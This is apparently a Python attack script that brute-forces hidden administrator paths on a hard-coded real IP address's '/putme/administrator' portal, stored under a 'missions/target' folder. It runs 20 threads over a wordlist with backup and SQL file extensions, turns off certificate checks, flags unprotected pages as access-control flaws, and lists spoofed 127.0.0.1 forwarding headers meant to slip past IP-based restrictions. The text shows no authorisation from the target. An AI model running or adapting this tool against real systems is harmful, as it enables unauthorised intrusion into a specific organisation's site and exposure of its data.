import requests
import concurrent.futures
import sys

TARGET_URL = "https://102.91.68.102/putme/administrator"
WORDLIST_FILE = "missions/target_102_91_68_102/admin_wordlist.txt"
EXTENSIONS = ["", ".php", ".html", ".txt", ".sql", ".bak", ".old", ".zip"]
HEADERS_TO_TEST = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "Referer": f"{TARGET_URL}/login.php"
}
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_path(word):
    for ext in EXTENSIONS:
        path = f"{word}{ext}"
        url = f"{TARGET_URL}/{path}"
        try:
            # Standard Request
            response = requests.get(url, timeout=5, allow_redirects=False, verify=False)
            if response.status_code in [200, 301, 302, 500]:
                print(f"[FOUND] {url} (Status: {response.status_code}, Size: {len(response.content)})")
                
                # If it's a 302 redirect to login.php, it's protected.
                # If 200, it might be vulnerable!
                if response.status_code == 200 and "login" not in response.url:
                     print(f"[POTENTIAL BAC] {url} (Status: 200)")

        except requests.RequestException:
            pass

def test_headers(url):
    # (Unchanged logic, though maybe less relevant if we find 200 OK pages directly)
    pass

def main():
    print(f"Starting brute-force on {TARGET_URL}...")
    
    try:
        with open(WORDLIST_FILE, "r") as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist file {WORDLIST_FILE} not found.")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_path, words)

    print("Scan complete.")

if __name__ == "__main__":
    main()
